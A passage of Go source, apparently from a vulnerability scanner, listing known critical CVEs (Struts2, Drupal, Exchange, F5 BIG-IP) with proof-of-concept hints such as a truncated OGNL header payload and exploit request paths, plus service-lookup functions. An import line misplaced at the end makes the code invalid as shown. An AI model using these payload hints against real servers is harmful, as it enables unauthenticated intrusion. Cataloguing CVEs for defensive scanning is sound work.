		Description: "Apache Struts2 RCE via Content-Type header OGNL injection (used in Equifax breach)",
		Impact:      "Unauthenticated Remote Code Execution",
		PoC:         `Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}`,
		Mitigation:  "Update Struts2 2.3.32+/2.5.10.1+",
		Tags:        []string{"RCE", "OGNL Injection", "Unauthenticated", "In-the-wild"},
	},
	{
		ID: "CVE-2018-7600", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2018,
		Description: "Drupalgeddon2: Drupal RCE via #access_callback property in form API",
		Impact:      "Unauthenticated Remote Code Execution",
		PoC:         "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
		Mitigation:  "Update Drupal 7.58+/8.3.9+/8.4.6+/8.5.1+",
		Tags:        []string{"RCE", "Unauthenticated", "In-the-wild"},
	},
	{
		ID: "CVE-2021-26855", Score: 9.8, Severity: "CRITICAL",
		Service: "https", Year: 2021,
		Description: "ProxyLogon: Exchange Server SSRF allows unauthenticated ACL bypass + RCE",
		Impact:      "Full Exchange Server takeover, email exfiltration",
		PoC:         "X-AnonResource-Backend header SSRF chain with CVE-2021-27065",
		Mitigation:  "Apply Exchange March 2021 CUs immediately",
		Tags:        []string{"SSRF", "RCE", "Unauthenticated", "Exchange", "In-the-wild"},
	},
	{
		ID: "CVE-2021-22986", Score: 9.8, Severity: "CRITICAL",
		Service: "https", Year: 2021,
		Description: "F5 BIG-IP iControl REST unauthenticated RCE",
		Impact:      "Unauthenticated Remote Code Execution as root",
		PoC:         "POST /mgmt/tm/util/bash with malicious body (no auth needed)",
		Mitigation:  "Apply F5 hotfix or restrict iControl REST access",
		Tags:        []string{"RCE", "Root", "Unauthenticated"},
	},
}

// LookupByService returns CVEs matching a given service name
func LookupByService(service string) []CVEEntry {
	svcLower := strings.ToLower(service)
	var results []CVEEntry

	serviceAliases := map[string][]string{
		"http":          {"http", "https", "web"},
		"https":         {"https", "http", "web"},
		"ssh":           {"ssh"},
		"ftp":           {"ftp"},
		"smtp":          {"smtp", "mail"},
		"mysql":         {"mysql", "mariadb"},
		"postgresql":    {"postgresql", "postgres"},
		"redis":         {"redis"},
		"mongodb":       {"mongodb", "mongo"},
		"elasticsearch": {"elasticsearch", "elastic"},
		"microsoft-ds":  {"microsoft-ds", "smb", "netbios"},
		"ms-wbt-server": {"ms-wbt-server", "rdp"},
		"vnc":           {"vnc"},
		"telnet":        {"telnet"},
		"dns":           {"dns"},
		"memcached":     {"memcached"},
		"amqp":          {"amqp", "rabbitmq"},
		"kubernetes-api": {"kubernetes-api", "kubernetes", "k8s"},
		"docker":        {"docker"},
	}

	aliases := serviceAliases[svcLower]
	if len(aliases) == 0 {
		aliases = []string{svcLower}
	}

	for _, cve := range KnownCVEs {
		for _, alias := range aliases {
			if strings.Contains(strings.ToLower(cve.Service), alias) ||
				strings.Contains(alias, strings.ToLower(cve.Service)) {
				results = append(results, cve)
				break
			}
		}
	}

	// Sort by score
	for i := 0; i < len(results); i++ {
		for j := i + 1; j < len(results); j++ {
			if results[i].Score < results[j].Score {
				results[i], results[j] = results[j], results[i]
			}
		}
	}

	return results
}

// LookupCritical returns only CRITICAL severity CVEs for a service
func LookupCritical(service string) []CVEEntry {
	all := LookupByService(service)
	var critical []CVEEntry
	for _, c := range all {
		if c.Score >= 9.0 {
			critical = append(critical, c)
		}
	}
	return critical
}

import "strings"
